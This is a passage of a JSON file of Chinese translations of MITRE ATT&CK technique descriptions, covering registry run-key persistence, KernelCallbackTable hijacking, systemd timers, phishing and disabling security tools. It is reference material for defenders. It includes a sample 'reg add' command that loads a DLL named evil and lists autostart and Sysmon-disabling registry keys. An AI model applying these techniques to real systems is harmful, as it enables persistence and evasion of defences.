        "translated_description": "对手可能通过劫持服务使用的二进制文件来执行他们自己的恶意有效载荷。对手可能利用Windows服务权限中的漏洞来替换服务启动时执行的二进制文件。这些服务进程可能会自动执行特定的二进制文件，作为其功能的一部分或执行其他操作。如果包含目标二进制文件的文件系统目录或二进制文件本身的权限设置不正确，则可以使用用户级权限覆盖目标二进制文件，并由原始进程执行。如果原始进程和线程在更高权限级别下运行，则替换的二进制文件也将在更高权限级别下执行，这可能包括SYSTEM。\n\n对手可能使用此技术替换合法二进制文件为恶意二进制文件，以便在更高权限级别下执行代码。如果执行进程设置为在特定时间或某个事件（例如系统启动）期间运行，则此技术也可用于持久性。"
    },
    "Registry Run Keys / Startup Folder": {
        "translated_name": "注册表运行键/启动文件夹",
        "translated_description": "对手可能通过将程序添加到启动文件夹或使用注册表运行键引用它来实现持久性。在注册表或启动文件夹中添加条目将导致引用的程序在用户登录时执行。(引用: Microsoft Run Key) 这些程序将在用户的上下文中执行，并具有该账户的相关权限级别。\n\n在Windows系统上默认创建以下运行键：\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\n运行键可能存在于多个配置单元下。(引用: Microsoft Wow6432Node 2018)(引用: Malwarebytes Wow6432Node 2016) <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> 也可用，但在Windows Vista及更高版本上默认未创建。注册表运行键条目可以直接引用程序或将其列为依赖项。(引用: Microsoft Run Key) 例如，可以使用RunOnceEx的“Depend”键在登录时加载DLL：<code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (引用: Oddvar Moe RunOnceEx Mar 2018)\n\n将程序放置在启动文件夹中也会导致该程序在用户登录时执行。每个用户账户都有一个启动文件夹位置，以及一个系统范围的启动文件夹，无论哪个用户账户登录都会检查。当前用户的启动文件夹路径是<code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>。所有用户的启动文件夹路径是<code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>。\n\n以下注册表键可用于设置启动文件夹项以实现持久性：\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\n以下注册表键可以控制启动期间服务的自动启动：\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\n使用策略设置指定启动程序会在以下两个注册表键中创建相应的值：\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\n列在注册表键<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>的加载值中的程序会自动为当前登录的用户运行。\n\n默认情况下，注册表键<code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code>的多字符串<code>BootExecute</code>值设置为<code>autocheck autochk *</code>。此值会导致Windows在启动时检查硬盘的文件系统完整性，如果系统异常关闭。对手可以将其他程序或进程添加到此注册表值中，这些程序或进程将在启动时自动启动。\n\n对手可以使用这些配置位置来执行恶意软件，例如远程访问工具，以在系统重启时保持持久性。对手还可以使用[伪装](https://attack.mitre.org/techniques/T1036)使注册表条目看起来与合法程序相关。"
    },
    "Trusted Relationship": {
        "translated_name": "信任关系",
        "translated_description": "对手可能会破坏或利用有权访问目标受害者的组织。通过信任的第三方关系访问滥用现有的连接，这些连接可能没有受到保护或比标准机制获得的访问更少受到审查。\n\n组织通常会授予第二或第三方外部提供商更高的访问权限，以允许他们管理内部系统以及基于云的环境。这些关系的一些示例包括IT服务承包商、托管安全提供商、基础设施承包商（例如HVAC、电梯、物理安全）。第三方提供商的访问权限可能仅限于维护的基础设施，但可能存在于与企业其余部分相同的网络中。因此，其他方用于访问内部网络系统的[有效账户](https://attack.mitre.org/techniques/T1078)可能会被破坏并使用。(引用: CISA IT Service Providers)\n\n在Office 365环境中，组织可能会授予Microsoft合作伙伴或经销商委派的管理员权限。通过破坏合作伙伴或经销商账户，对手可能能够利用现有的委派管理员关系或向客户发送新的委派管理员邀请，以获得受害者租户的管理控制权。(引用: Office 365 Delegated Administration)"
    },
    "Local Groups": {
        "translated_name": "本地组",
        "translated_description": "对手可能会尝试查找本地系统组和权限设置。了解本地系统权限组可以帮助对手确定哪些组存在以及哪些用户属于特定组。对手可能会使用此信息来确定哪些用户具有提升的权限，例如在本地管理员组中的用户。\n\n命令如<code>net localgroup</code>的[Net](https://attack.mitre.org/software/S0039)实用程序、macOS上的<code>dscl . -list /Groups</code>和Linux上的<code>groups</code>可以列出本地组。"
    },
    "Search Open Websites/Domains": {
        "translated_name": "搜索开放网站/域",
        "translated_description": "对手可能会搜索自由可用的网站和/或域，以获取有关受害者的信息，这些信息可在目标过程中使用。有关受害者的信息可能在各种在线网站上可用，例如社交媒体、新网站或托管有关业务运营的信息的网站，如招聘或请求/奖励合同。(引用: Cyware Social Media)(引用: SecurityTrails Google Hacking)(引用: ExploitDB GoogleHacking)\n\n对手可能会在不同的在线网站中搜索，具体取决于他们希望收集的信息。这些来源的信息可能会揭示其他形式的侦察机会（例如[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)），建立操作资源（例如[建立账户](https://attack.mitre.org/techniques/T1585)或[妥协账户](https://attack.mitre.org/techniques/T1586)），和/或初始访问（例如[外部远程服务](https://attack.mitre.org/techniques/T1133)或[网络钓鱼](https://attack.mitre.org/techniques/T1566)）。"
    },
    "Account Manipulation": {
        "translated_name": "账户操纵",
        "translated_description": "对手可能会操纵账户以保持和/或提升对受害者系统的访问权限。账户操纵可能包括任何保持或修改对手访问被破坏账户的操作，例如修改凭据或权限组。(引用: FireEye SMOKEDHAM June 2021) 这些操作还可能包括旨在颠覆安全策略的账户活动，例如执行迭代密码更新以绕过密码持续时间策略并保持被破坏凭据的寿命。\n\n为了创建或操纵账户，对手必须已经在系统或域上具有足够的权限。然而，账户操纵也可能导致权限提升，其中修改授予对其他角色、权限或更高权限的[有效账户](https://attack.mitre.org/techniques/T1078)的访问权限。"
    },
    "Exfiltration Over Alternative Protocol": {
        "translated_name": "通过替代协议外传",
        "translated_description": "对手可能通过不同于现有命令和控制通道的协议窃取数据。数据也可能被发送到与主命令和控制服务器不同的网络位置。\n\n替代协议包括FTP、SMTP、HTTP/S、DNS、SMB或任何其他未用作主命令和控制通道的网络协议。对手还可能选择加密和/或混淆这些替代通道。\n\n[通过替代协议外传](https://attack.mitre.org/techniques/T1048)可以使用各种常见的操作系统实用程序完成，例如[Net](https://attack.mitre.org/software/S0039)/SMB或FTP。(引用: Palo Alto OilRig Oct 2016) 在macOS和Linux上，<code>curl</code>可以用于调用HTTP/S或FTP/S等协议，以从系统中外传数据。(引用: 20 macOS Common Tools and Techniques)\n\n许多IaaS和SaaS平台（如Microsoft Exchange、Microsoft SharePoint、GitHub和AWS S3）支持通过Web控制台或[云API](https://attack.mitre.org/techniques/T1059/009)直接下载文件、电子邮件、源代码和其他敏感信息。"
    },
    "Kernel Modules and Extensions": {
        "translated_name": "内核模块和扩展",
        "translated_description": "对手可能会修改内核以在系统启动时自动执行程序。可加载内核模块（LKM）是可以按需加载和卸载到内核中的代码片段。它们扩展了内核的功能，而无需重新启动系统。例如，一种类型的模块是设备驱动程序，它允许内核访问连接到系统的硬件。(引用: Linux Kernel Programming)\n\n恶意使用时，LKM可以是一种内核模式[Rootkit](https://attack.mitre.org/techniques/T1014)，以最高的操作系统权限（Ring 0）运行。(引用: Linux Kernel Module Programming Guide) LKM基于rootkit的常见功能包括：隐藏自身、选择性隐藏文件、进程和网络活动，以及日志篡改、提供认证的后门，并使非特权用户能够获得root访问权限。(引用: iDefense Rootkit Overview)\n\n内核扩展，也称为kext，在macOS中用于加载功能，类似于Linux的LKM。由于内核负责执行安全性，并且内核扩展作为内核的一部分运行，因此kext不受macOS安全策略的约束。kext通过<code>kextload</code>和<code>kextunload</code>命令加载和卸载。kext需要使用开发者ID签名，该ID由Apple授予权限，允许其签名内核扩展。没有这些权限的开发者仍然可以签名kext，但除非禁用SIP，否则它们不会加载。如果启用了SIP，则在将kext添加到AuxKC之前会验证其签名。(引用: System and kernel extensions in macOS)\n\n自macOS Catalina 10.15以来，内核扩展已被弃用，取而代之的是系统扩展。然而，kext仍然被允许作为“遗留系统扩展”，因为没有用于内核编程接口的系统扩展。(引用: Apple Kernel Extension Deprecation)\n\n对手可以使用LKM和kext在系统上进行[持久性](https://attack.mitre.org/tactics/TA0003)和/或[权限提升](https://attack.mitre.org/tactics/TA0004)。在野外已经发现了一些示例，并且也有一些相关的开源项目。(引用: Volatility Phalanx2)(引用: CrowdStrike Linux Rootkit)(引用: GitHub Reptile)(引用: GitHub Diamorphine)(引用: RSAC 2015 San Francisco Patrick Wardle)(引用: Synack Secure Kernel Extension Broken)(引用: Securelist Ventir)(引用: Trend Micro Skidmap)"
    },
    "GUI Input Capture": {
        "translated_name": "GUI输入捕获",
        "translated_description": "对手可能会模仿常见的操作系统GUI组件，以看似合法的提示来提示用户输入凭据。当执行需要比当前用户上下文中存在的权限更高的程序时，操作系统通常会提示用户输入适当的凭据，以授权任务的提升权限（例如：[绕过用户帐户控制](https://attack.mitre.org/techniques/T1548/002)）。\n\n对手可能会模仿此功能，以看似合法的提示来提示用户输入凭据，原因有很多，例如需要额外访问权限的假安装程序或假恶意软件删除套件。(引用: OSX Malware Exploits MacKeeper) 这种类型的提示可以通过各种语言收集凭据，例如[AppleScript](https://attack.mitre.org/techniques/T1059/002)(引用: LogRhythm Do You Trust Oct 2014)(引用: OSX Keydnap malware)(引用: Spoofing credential dialogs)和[PowerShell](https://attack.mitre.org/techniques/T1059/001)。(引用: LogRhythm Do You Trust Oct 2014)(引用: Enigma Phishing for Credentials Jan 2015)(引用: Spoofing credential dialogs) 在Linux系统上，对手可能会从恶意shell脚本或命令行启动对话框，提示用户输入凭据（即[Unix Shell](https://attack.mitre.org/techniques/T1059/004)）。(引用: Spoofing credential dialogs)\n\n对手还可能模仿常见的软件认证请求，例如来自浏览器或电子邮件客户端的请求。这也可能与用户活动监控（即，[浏览器信息发现](https://attack.mitre.org/techniques/T1217)和/或[应用程序窗口发现](https://attack.mitre.org/techniques/T1010)）配对，以在用户自然访问敏感站点/数据时伪造提示。"
    },
    "Tool": {
        "translated_name": "工具",
        "translated_description": "对手可能会购买、窃取或下载可用于目标过程的软件工具。工具可以是开源或闭源的，免费或商业的。工具可以被对手用于恶意目的，但（与恶意软件不同）并非旨在用于这些目的（例如：[PsExec](https://attack.mitre.org/software/S0029)）。工具获取可能涉及采购商业软件许可证，包括红队工具如[Cobalt Strike](https://attack.mitre.org/software/S0154)。商业软件可能通过购买、窃取许可证（或软件的许可副本）或破解试用版本获得。(引用: Recorded Future Beacon 2019)\n\n对手可能获取工具以支持其操作，包括支持妥协后的行为执行。除了自由下载或购买软件外，对手还可能从第三方实体（包括其他对手）窃取软件和/或软件许可证。"
    },
    "Exfiltration over USB": {
        "translated_name": "通过USB外传",
        "translated_description": "对手可能尝试通过USB连接的物理设备外传数据。在某些情况下，例如隔离网络妥协，外传可能通过用户引入的USB设备进行。USB设备可以用作最终的外传点或在其他断开连接的系统之间跳转。"
    },
    "KernelCallbackTable": {
        "translated_name": "KernelCallbackTable",
        "translated_description": "对手可能滥用进程的<code>KernelCallbackTable</code>来劫持其执行流以运行自己的有效载荷。(引用: Lazarus APT January 2022)(引用: FinFisher exposed) <code>KernelCallbackTable</code>可以在进程环境块（PEB）中找到，并在加载<code>user32.dll</code>后初始化为GUI进程可用的图形函数数组。(引用: Windows Process Injection KernelCallbackTable)\n\n对手可能通过替换原始回调函数为恶意有效载荷来劫持进程的执行流。修改回调函数可以通过涉及相关行为的各种方式实现，例如[反射代码加载](https://attack.mitre.org/techniques/T1620)或[进程注入](https://attack.mitre.org/techniques/T1055)到另一个进程中。\n\n可以通过定位PEB（例如，通过调用<code>NtQueryInformationProcess()</code> [本机API](https://attack.mitre.org/techniques/T1106)函数）获得指向<code>KernelCallbackTable</code>内存地址的指针。(引用: NtQueryInformationProcess) 一旦找到指针，可以复制<code>KernelCallbackTable</code>，并将表中的函数（例如<code>fnCOPYDATA</code>）设置为恶意有效载荷的地址（例如通过<code>WriteProcessMemory()</code>）。然后更新PEB以包含新表的地址。一旦调用篡改的函数，恶意有效载荷将被触发。(引用: Lazarus APT January 2022)\n\n篡改的函数通常使用Windows消息调用。在劫持进程并执行恶意代码后，<code>KernelCallbackTable</code>也可能由恶意有效载荷的其余部分恢复到其原始状态。(引用: Lazarus APT January 2022) 使用<code>KernelCallbackTable</code>劫持执行流可能会规避安全产品的检测，因为执行可以掩盖在合法进程下。"
    },
    "Search Closed Sources": {
        "translated_name": "搜索封闭来源",
        "translated_description": "对手可能会搜索和收集关于受害者的信息，这些信息来自封闭的（例如，付费、私有或其他非自由可用的）来源，可以在目标过程中使用。关于受害者的信息可能可以从信誉良好的私人来源和数据库中购买，例如付费订阅技术/威胁情报数据的订阅。对手也可能从不太可信的来源购买信息，例如暗网或网络犯罪黑市。(引用: ZDNET Selling Data)\n\n对手可能会在不同的封闭数据库中搜索，具体取决于他们希望收集的信息。这些来源的信息可能会揭示其他形式的侦察机会（例如[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)），和/或初始访问（例如[外部远程服务](https://attack.mitre.org/techniques/T1133)或[有效账户](https://attack.mitre.org/techniques/T1078)）。"
    },
    "Systemd Timers": {
        "translated_name": "Systemd计时器",
        "translated_description": "对手可能滥用systemd计时器来执行任务调度，以初始或定期执行恶意代码。Systemd计时器是文件扩展名为<code>.timer</code>的单元文件，用于控制服务。计时器可以设置为在日历事件或相对于起点的时间跨度后运行。它们可以作为Linux环境中[Cron](https://attack.mitre.org/techniques/T1053/003)的替代品。(引用: archlinux Systemd Timers Aug 2020) Systemd计时器可以通过<code>systemctl</code>命令行实用程序远程激活，该实用程序通过[SSH](https://attack.mitre.org/techniques/T1021/004)操作。(引用: Systemd Remote Control)\n\n每个<code>.timer</code>文件必须有一个对应的<code>.service</code>文件，名称相同，例如<code>example.timer</code>和<code>example.service</code>。<code>.service</code>文件是[Systemd服务](https://attack.mitre.org/techniques/T1543/002)单元文件，由systemd系统和服务管理器管理。(引用: Linux man-pages: systemd January 2014) 特权计时器写入<code>/etc/systemd/system/</code>和<code>/usr/lib/systemd/system</code>，而用户级别的写入<code>~/.config/systemd/user/</code>。\n\n对手可能使用systemd计时器在系统启动时或定期执行恶意代码以实现持久性。(引用: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(引用: gist Arch package compromise 10JUL2018)(引用: acroread package compromised Arch Linux Mail 8JUL2018) 使用特权路径安装的计时器可能用于保持root级别的持久性。对手也可能安装用户级别的计时器以实现用户级别的持久性。(引用: Falcon Sandbox smp: 28553b3a9d)"
    },
    "Phishing": {
        "translated_name": "网络钓鱼",
        "translated_description": "对手可能会发送网络钓鱼消息以获取对受害者系统的访问权限。所有形式的网络钓鱼都是电子传递的社会工程。网络钓鱼可以是有针对性的，称为鱼叉式网络钓鱼。在鱼叉式网络钓鱼中，对手将针对特定个人、公司或行业。更一般地，对手可以进行非针对性的网络钓鱼，例如大规模恶意软件垃圾邮件活动。\n\n对手可能会向受害者发送包含恶意附件或链接的电子邮件，通常以在受害者系统上执行恶意代码为目的。网络钓鱼也可以通过第三方服务进行，例如社交媒体平台。网络钓鱼还可能涉及社会工程技术，例如冒充可信来源，以及规避技术，例如删除或操纵被滥用发送消息的被破坏账户的电子邮件或元数据/头部（例如，[电子邮件隐藏规则](https://attack.mitre.org/techniques/T1564/008)）。(引用: Microsoft OAuth Spam 2022)(引用: Palo Alto Unit 42 VBA Infostealer 2014) 另一种实现此目的的方法是伪造或欺骗(引用: Proofpoint-spoof)发件人的身份，这可以用来欺骗人类接收者以及自动化安全工具，(引用: cyberproof-double-bounce) 或通过将目标作为现有电子邮件线程的一部分，包括恶意文件或链接（即“线程劫持”）。(引用: phishing-krebs)\n\n受害者还可能收到指示他们拨打电话号码的网络钓鱼消息，在那里他们被引导访问恶意URL、下载恶意软件，(引用: sygnia Luna Month)(引用: CISA Remote Monitoring and Management Software) 或在其计算机上安装对手可访问的远程管理工具（即，[用户执行](https://attack.mitre.org/techniques/T1204)）。(引用: Unit42 Luna Moth)"
    },
    "ROMMONkit": {
        "translated_name": "ROMMONkit",
        "translated_description": "对手可能通过加载包含对手代码的未经授权的固件来滥用ROM Monitor（ROMMON），以提供持久访问并操纵设备行为，这很难检测到。(引用: Cisco Synful Knock Evolution)(引用: Cisco Blog Legacy Device Attacks)\n\n\nROMMON是Cisco网络设备固件，作为引导加载程序、引导映像或引导助手在平台上电或重置时初始化硬件和软件。类似于[TFTP引导](https://attack.mitre.org/techniques/T1542/005)，对手可能通过本地或远程（例如，通过TFTP）升级ROMMON映像，包含对手代码并重新启动设备，以覆盖现有的ROMMON映像。这为对手提供了一种方式，通过更新ROMMON在系统上获得持久性，这可能很难检测到。"
    },
    "Compiled HTML File": {
        "translated_name": "编译HTML文件",
        "translated_description": "对手可能滥用编译HTML文件（.chm）来隐藏恶意代码。CHM文件通常作为Microsoft HTML帮助系统的一部分分发。CHM文件是各种内容的压缩编译，例如HTML文档、图像和脚本/网页相关编程语言，如VBA、JScript、Java和ActiveX。(引用: Microsoft HTML Help May 2018) CHM内容使用Internet Explorer浏览器的底层组件显示(引用: Microsoft HTML Help ActiveX)，由HTML帮助可执行程序（hh.exe）加载。(引用: Microsoft HTML Help Executable Program)\n\n自定义CHM文件包含嵌入的有效载荷，可以传递给受害者，然后通过[用户执行](https://attack.mitre.org/techniques/T1204)触发。CHM执行也可能绕过旧版和/或未修补系统上的应用程序控制，这些系统不考虑通过hh.exe执行二进制文件。(引用: MsitPros CHM Aug 2017)(引用: Microsoft CVE-2017-8625 Aug 2017)"
    },
    "Compute Hijacking": {
        "translated_name": "计算劫持",
        "translated_description": "对手可能利用被劫持系统的计算资源来完成资源密集型任务，这可能会影响系统和/或托管服务的可用性。\n\n[计算劫持](https://attack.mitre.org/techniques/T1496/001)的一个常见目的是验证加密货币网络的交易并赚取虚拟货币。对手可能消耗足够的系统资源，以负面影响和/或导致受影响的机器变得无响应。(引用: Kaspersky Lazarus Under The Hood Blog 2017) 服务器和基于云的系统是常见目标，因为它们具有高潜在可用资源，但用户端点系统也可能被妥协并用于[计算劫持](https://attack.mitre.org/techniques/T1496/001)和加密货币挖矿。(引用: CloudSploit - Unused AWS Regions) 容器化环境也可能成为目标，因为通过暴露的API进行部署的容易性，以及通过在环境或集群中部署或妥协多个容器来扩展挖矿活动的潜力。(引用: Unit 42 Hildegard Malware)(引用: Trend Micro Exposed Docker APIs)\n\n此外，一些加密货币挖矿恶意软件会识别并杀死竞争恶意软件的进程，以确保其不与资源竞争。(引用: Trend Micro War of Crypto Miners)"
    },
    "Network Share Connection Removal": {
        "translated_name": "删除网络共享连接",
        "translated_description": "对手可能会删除不再有用的共享连接，以清理其操作痕迹。Windows共享驱动器和[SMB/Windows管理员共享](https://attack.mitre.org/techniques/T1021/002)连接可以在不再需要时删除。[Net](https://attack.mitre.org/software/S0039)是一个可以使用<code>net use \\\\system\\share /delete</code>命令删除网络共享连接的实用程序。(引用: Technet Net Use)"
    },
    "Multi-hop Proxy": {
        "translated_name": "多跳代理",
        "translated_description": "对手可能会链式连接多个代理来掩盖恶意流量的来源。通常，防御者将能够识别恶意流量进入其网络之前的最后一个代理；防御者可能无法识别最后一个代理之前的任何代理。此技术通过要求防御者追踪恶意流量通过多个代理来识别其来源，使识别恶意流量的原始来源更加困难。\n\n例如，对手可能构建或使用洋葱路由网络——如公开可用的[Tor](https://attack.mitre.org/software/S0183)网络——通过受感染的群体传输加密的C2流量，允许与网络内任何设备通信。(引用: Onion Routing) 对手还可能使用由虚拟私人服务器（VPS）、物联网（IoT）设备、智能设备和寿命终止的路由器组成的操作中继盒（ORB）网络来混淆其操作。(引用: ORB Mandiant) \n\n在网络基础设施的情况下，对手可能利用多个受感染设备创建多跳代理链（即，[网络设备](https://attack.mitre.org/techniques/T1584/008)）。通过利用[补丁系统映像](https://attack.mitre.org/techniques/T1601/001)在路由器上，对手可以向受影响的网络设备添加自定义代码，实现这些节点之间的洋葱路由。此方法依赖于[网络边界桥接](https://attack.mitre.org/techniques/T1599)方法，允许对手跨越互联网边界的受保护网络边界，进入组织的广域网（WAN）。协议如ICMP可能被用作传输。\n\n类似地，对手可能滥用点对点（P2P）和区块链导向的基础设施，在去中心化的对等网络之间实现路由。(引用: NGLite Trojan)"
    },
    "Brute Force": {
        "translated_name": "暴力破解",
        "translated_description": "对手可能使用暴力破解技术在密码未知或获得密码哈希时获取账户访问权限。(引用: TrendMicro Pawn Storm Dec 2020) 在不知道账户密码的情况下，对手可能使用重复或迭代机制系统地猜测密码。(引用: Dragos Crashoverride 2018) 暴力破解密码可以通过与验证这些凭据有效性的服务交互进行，也可以离线对先前获取的凭据数据（如密码哈希）进行。\n\n暴力破解凭据可能在入侵的各个阶段进行。例如，对手可能尝试暴力破解访问受害者环境中的[有效账户](https://attack.mitre.org/techniques/T1078)，利用从其他后期妥协行为中收集的知识，如[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)、[账户发现](https://attack.mitre.org/techniques/T1087)或[密码策略发现](https://attack.mitre.org/techniques/T1201)。对手还可能将暴力破解活动与[外部远程服务](https://attack.mitre.org/techniques/T1133)等行为结合，作为初始访问的一部分。"
    },
    "Unix Shell": {
        "translated_name": "Unix Shell",
        "translated_description": "对手可能滥用Unix shell命令和脚本进行执行。Unix shell是Linux和macOS系统上的主要命令提示符，尽管根据具体的操作系统或发行版，存在许多Unix shell的变体（例如sh、bash、zsh等）。(引用: DieNet Bash)(引用: Apple ZShell) Unix shell可以控制系统的每个方面，某些命令需要提升的权限。\n\nUnix shell还支持脚本，允许顺序执行命令以及其他典型的编程操作，如条件和循环。shell脚本的常见用途包括长时间或重复的任务，或需要在多个系统上运行相同的命令集。\n\n对手可能滥用Unix shell执行各种命令或有效载荷。通过命令和控制通道或横向移动（如使用[SSH](https://attack.mitre.org/techniques/T1021/004)）可以访问交互式shell。对手还可能利用shell脚本传递和执行多个命令，或作为用于持久性的有效载荷的一部分。"
    },
    "Outlook Forms": {
        "translated_name": "Outlook表单",
        "translated_description": "对手可能滥用Microsoft Outlook表单在受感染系统上获得持久性。Outlook表单用于在Outlook消息中呈现和功能的模板。可以创建自定义Outlook表单，当对手使用相同的自定义Outlook表单发送特定格式的电子邮件时，将执行代码。(引用: SensePost Outlook Forms)\n\n一旦恶意表单被添加到用户的邮箱中，它们将在Outlook启动时加载。当对手向用户发送特定格式的电子邮件时，恶意表单将执行。(引用: SensePost Outlook Forms)"
    },
    "Disable or Modify Tools": {
        "translated_name": "禁用或修改工具",
        "translated_description": "对手可能会修改和/或禁用安全工具，以避免其恶意软件/工具和活动被检测到。这可能采取多种形式，例如终止安全软件进程或服务，修改/删除注册表键或配置文件，使工具无法正常运行，或其他干扰安全工具扫描或报告信息的方法。对手还可能禁用更新，防止最新的安全补丁到达受害者系统上的工具。(引用: SCADAfence_ransomware)\n\n对手还可能篡改安全工具部署和使用的工件。安全工具可能会对系统组件进行动态更改，以保持对特定事件的可见性。类似于[指标阻断](https://attack.mitre.org/techniques/T1562/006)，对手可能取消挂钩或以其他方式修改工具添加的这些功能（尤其是那些存在于用户态或对手可能访问的功能），以避免检测。(引用: OutFlank System Calls)(引用: MDSec System Calls) \n\n对手还可能专注于特定应用程序，如Sysmon。例如，<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code>中的“Start”和“Enable”值可能被修改，以篡改和可能禁用Sysmon日志记录。(引用: disable_win_evt_logging) \n\n在网络设备上，对手可能尝试通过更改启动配置文件跳过数字签名验证检查，从而有效地禁用通常在启动时进行的固件验证。(引用: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(引用: Analysis of FG-IR-22-369)\n\n在云环境中，对手禁用的工具可能包括向AWS CloudWatch或Google Cloud Monitor等服务报告的云监控代理。\n\n此外，尽管防御工具可能具有防篡改机制，对手可能滥用合法的rootkit移除工具来削弱和/或禁用这些工具。(引用: chasing_avaddon_ransomware)(引用: dharma_ransomware)(引用: demystifying_ryuk)(引用: doppelpaymer_crowdstrike) 例如，对手已使用GMER等工具查找并关闭受感染系统上的隐藏进程和防病毒软件。(引用: demystifying_ryuk)\n\n此外，对手可能利用防病毒软件的合法驱动程序访问内核空间（即[利用权限提升](https://attack.mitre.org/techniques/T1068)），这可能导致绕过防篡改功能。(引用: avoslocker_ransomware)"
    },
    "Data Manipulation": {
        "translated_name": "数据操纵",
        "translated_description": "对手可能会插入、删除或操纵数据，以影响外部结果或隐藏活动，从而威胁数据的完整性。(引用: Sygnia Elephant Beetle Jan 2022) 通过操纵数据，对手可能试图影响业务流程、组织理解或决策。\n\n修改的类型及其影响取决于目标应用程序和过程以及对手的目标和目的。对于复杂系统，对手可能需要特殊的专业知识，并可能需要通过长期的信息收集活动获得与系统相关的专业软件，以实现预期的影响。"
    },
    "Inter-Process Communication": {
        "translated_name": "进程间通信",
        "translated_description": "对手可能会滥用进程间通信（IPC）机制进行本地代码或命令执行。IPC通常用于进程共享数据、相互通信或同步执行。IPC也常用于避免死锁等情况，死锁是指进程陷入循环等待模式。\n\n对手可能会滥用IPC执行任意代码或命令。IPC机制可能因操作系统而异，但通常以编程语言/库或本机接口（如Windows [动态数据交换](https://attack.mitre.org/techniques/T1559/002)或[组件对象模型](https://attack.mitre.org/techniques/T1559/001)）的形式存在。Linux环境支持几种不同的IPC机制，其中两种是套接字和管道。(引用: Linux IPC) 更高级的执行媒介，如[命令和脚本解释器](https://attack.mitre.org/techniques/T1059)，也可能利用底层的IPC机制。对手还可能使用[远程服务](https://attack.mitre.org/techniques/T1021)，如[分布式组件对象模型](https://attack.mitre.org/techniques/T1021/003)，以促进远程IPC执行。(引用: Fireeye Hunting COM June 2019)"
    },
    "Data Obfuscation": {
        "translated_name": "数据混淆",
        "translated_description": "对手可能会混淆命令和控制流量，使其更难被检测到。(引用: Bitdefender FunnyDream Campaign November 2020) 命令和控制（C2）通信被隐藏（但不一定加密），以试图使内容更难被发现或解读，并使通信不那么显眼，隐藏命令不被看到。这包括许多方法，如向协议流量中添加垃圾数据、使用隐写术或模仿合法协议。"
    },
    "Data from Network Shared Drive": {
        "translated_name": "来自网络共享驱动器的数据",
        "translated_description": "对手可能会在他们已妥协的计算机上搜索网络共享，以查找感兴趣的文件。敏感数据可以通过当前系统可访问的共享网络驱动器（主机共享目录、网络文件服务器等）从远程系统收集，然后进行外传。可能会使用交互式命令外壳，并且可能使用[cmd](https://attack.mitre.org/software/S0106)中的常见功能来收集信息。"
    },
    "Modify System Image": {
        "translated_name": "修改系统映像",
        "translated_description": "对手可能会更改嵌入式网络设备的操作系统，以削弱防御并为自己提供新的能力。在这些设备上，操作系统通常是单片的，大多数设备功能和能力都包含在一个文件中。\n\n要更改操作系统，对手通常只需影响这个文件，替换或修改它。这可以在系统运行时在内存中实时完成，以立即生效，或在存储中进行更改，以在网络设备的下次启动时实施更改。"
    },
    "Hijack Execution Flow": {
        "translated_name": "劫持执行流",
        "translated_description": "对手可能通过劫持操作系统运行程序的方式来执行他们自己的恶意有效载荷。劫持执行流可以用于持久性，因为这种劫持的执行可能会随着时间的推移而重复发生。对手还可能使用这些机制来提升权限或规避防御，例如应用程序控制或其他执行限制。\n\n对手可能通过多种方式劫持执行流，包括操纵操作系统定位要执行的程序的方式。操作系统定位程序使用的库的方式也可以被拦截。操作系统查找程序/资源的位置，例如文件目录，在Windows中是注册表，也可能被污染以包含恶意有效载荷。"
    },
    "Lua": {
        "translated_name": "Lua",
